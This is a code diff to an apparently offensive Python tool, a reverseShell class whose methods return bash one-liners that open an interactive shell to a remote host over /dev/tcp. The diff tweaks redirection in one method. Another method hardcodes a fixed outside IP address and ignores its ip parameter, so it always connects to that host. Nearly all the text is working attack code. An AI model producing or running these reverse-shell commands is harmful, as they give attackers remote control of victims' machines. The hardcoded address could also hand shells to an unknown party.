@@ -10,7 +10,7 @@ class reverseShell():
         return 'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(ip, port)
 
     def typeBash1(self, ip, port):
-        return '/bin/bash -i > /dev/tcp/{0}/{1} 0<& 2>&1'.format(ip, port)
+        return '/bin/bash -i >& /dev/tcp/{0}/{1} 0<& 2>&1'.format(ip, port)
 
     def typeBash2(self, ip, port):
         return 'exec 5<>/dev/tcp/61.164.47.202/{1};cat <&5|while read line; do $line 2>&5 >&5;done'.format(ip, port)
